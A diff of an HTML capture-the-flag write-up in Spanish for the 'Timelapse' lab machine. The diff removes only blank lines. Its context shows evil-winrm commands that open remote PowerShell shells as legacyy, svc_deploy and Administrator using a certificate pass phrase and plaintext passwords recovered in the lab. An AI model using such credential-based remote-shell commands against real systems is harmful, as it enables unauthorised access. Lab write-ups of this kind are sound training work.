@@ -304,7 +304,6 @@ Verifying - Enter PEM pass phrase: thuglegacy</span>
 <p class="plain-text">Con evil-winrm por el puerto ssl (5986) podemos autenticarnos pasandole esos 2 archivos, como resultado obtenemos una shell como legacyy</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ evil-winrm</span><span class="p"> -S -i timelapse.htb -c crt -k key
-
 Enter PEM pass phrase: thuglegacy
 
 PS C:\Users\legacyy\Documents> </span><span class="am">whoami</span><span class="p">
@@ -350,7 +349,6 @@ PS C:\Users\legacyy\Documents></span>
 <p class="plain-text">Nos conectamos como el usuario svc_deploy con evil-winrm, obtenemos una shell</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ evil-winrm</span><span class="p"> -S -i timelapse.htb -u svc_deploy -p </span><span class="am">'E3R$Q62^12p7PLlC%KWaxuaV'</span><span class="p">  
-
 PS C:\Users\svc_deploy\Documents> </span><span class="am">whoami</span><span class="p">
 timelapse\svc_deploy
 PS C:\Users\svc_deploy\Documents></span>
@@ -394,7 +392,6 @@ PS C:\Users\svc_deploy\Documents></span>
 <p class="plain-text">Usamos la contraseña que se nos muestra para conectarnos con evil-winrm, obtenemos una shell como Administrator sin embargo no esta la flag en el escritorio</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ evil-winrm</span><span class="p"> -S -i timelapse.htb -u Administrator -p </span><span class="am">'2mpY8H70i(28Q@B0M8r0c0cF'</span><span class="p">  
-
 PS C:\Users\Administrator\Documents> </span><span class="am">whoami</span><span class="p">
 timelapse\administrator
 PS C:\Users\Administrator\Documents> </span><span class="am">dir</span><span class="p"> ..\Desktop
